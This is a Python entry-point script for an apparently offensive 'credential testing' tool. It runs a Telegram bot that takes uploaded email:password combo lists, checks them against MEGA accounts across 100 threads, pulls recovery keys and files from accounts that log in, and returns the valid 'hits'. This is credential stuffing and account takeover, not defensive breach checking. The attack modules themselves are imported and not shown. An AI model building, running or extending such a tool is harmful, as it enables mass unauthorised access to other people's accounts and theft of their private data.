"""
Credential Testing System - Main Entry Point
MEGA validator + Breach detector + Telegram bot

Upload combos → Test validity → Find breaches → Extract info → Download results
"""

import asyncio
import logging
import os
import sys
from pathlib import Path
from dotenv import load_dotenv

# Add project root to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

# Load environment
load_dotenv()

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('credential_testing.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)


async def main():
    """Main async entry point"""
    try:
        logger.info("🔓 CREDENTIAL TESTING SYSTEM")
        logger.info("=" * 70)
        
        # Import system components
        from core.credential_tester import CredentialTester
        from bot.credential_testing_bot import CredentialTestingBot
        from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters
        
        # Get config from environment
        bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
        admin_id = int(os.getenv('ADMIN_USER_ID', os.getenv('TELEGRAM_ADMIN_IDS', '0').split(',')[0]))
        
        if not bot_token:
            raise ValueError("TELEGRAM_BOT_TOKEN not set in .env file")
        if not admin_id:
            raise ValueError("ADMIN_USER_ID not set in .env file")
        
        logger.info("")
        logger.info("🔧 Initializing components...")
        
        # Initialize credential tester
        tester = CredentialTester(max_threads=100)
        logger.info("✅ Credential tester initialized")
        logger.info("   • MEGA account validator ready")
        logger.info("   • HaveIBeenPwned breach detector ready")
        logger.info("   • Account info extractor ready")
        
        # Initialize Telegram bot
        bot = CredentialTestingBot(
            credential_tester=tester,
            admin_user_id=admin_id
        )
        logger.info("✅ Telegram bot initialized")
        
        # Build application
        app = ApplicationBuilder().token(bot_token).build()
        
        # Add command handlers
        app.add_handler(CommandHandler("start", bot.cmd_start))
        app.add_handler(CommandHandler("status", bot.cmd_status))
        app.add_handler(CommandHandler("stats", bot.cmd_stats))
        app.add_handler(CommandHandler("get_hits", bot.cmd_get_hits))
        app.add_handler(CommandHandler("get_breaches", bot.cmd_get_breaches))
        app.add_handler(CommandHandler("get_report", bot.cmd_get_report))
        app.add_handler(CommandHandler("stop", bot.cmd_stop))
        app.add_handler(CommandHandler("help", bot.cmd_help))
        
        # Add document handler for combo files
        app.add_handler(MessageHandler(filters.Document.ALL, bot.handle_document))
        
        logger.info("")
        logger.info("=" * 70)
        logger.info("🎉 SYSTEM READY!")
        logger.info("=" * 70)
        logger.info("")
        logger.info("⚡ Features:")
        logger.info("  • MEGA account validation (100+ threads)")
        logger.info("  • HaveIBeenPwned breach detection")
        logger.info("  • Account data extraction (recovery keys, files, storage)")
        logger.info("  • Password breach frequency lookup")
        logger.info("  • Risk scoring (0-100)")
        logger.info("  • Real-time hit notifications")
        logger.info("")
        logger.info("📱 Telegram Bot: @ai_email_checker_bot")
        logger.info("👤 Admin ID: {admin_id}")
        logger.info("")
        logger.info("Commands:")
        logger.info("  /start - Welcome message")
        logger.info("  /status - System status")
        logger.info("  /stats - Statistics")
        logger.info("  /get_hits - Download valid credentials")
        logger.info("  /get_breaches - Download breach report")
        logger.info("  /get_report - Download full JSON")
        logger.info("  /stop - Stop current test")
        logger.info("  /help - Help message")
        logger.info("")
        logger.info("📁 Upload combo file (.txt) to start testing!")
        logger.info("   Format: email:password (one per line)")
        logger.info("")
        logger.info("Press Ctrl+C to stop")
        logger.info("=" * 70)
        
        # Run bot
        async with app:
            await app.start()
            await app.updater.start_polling()
            
            # Keep running until interrupted
            stop_event = asyncio.Event()
            try:
                await stop_event.wait()
            except (KeyboardInterrupt, asyncio.CancelledError):
                logger.info("\n\n🛑 Shutdown signal received...")
        
    except Exception as e:
        logger.error(f"❌ Fatal error: {e}", exc_info=True)
        raise
    
    finally:
        # Cleanup
        logger.info("🧹 Cleaning up...")
        if 'app' in locals() and app.running:
            try:
                await app.updater.stop()
                await app.stop()
            except:
                pass
        logger.info("✅ Shutdown complete")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Goodbye!")
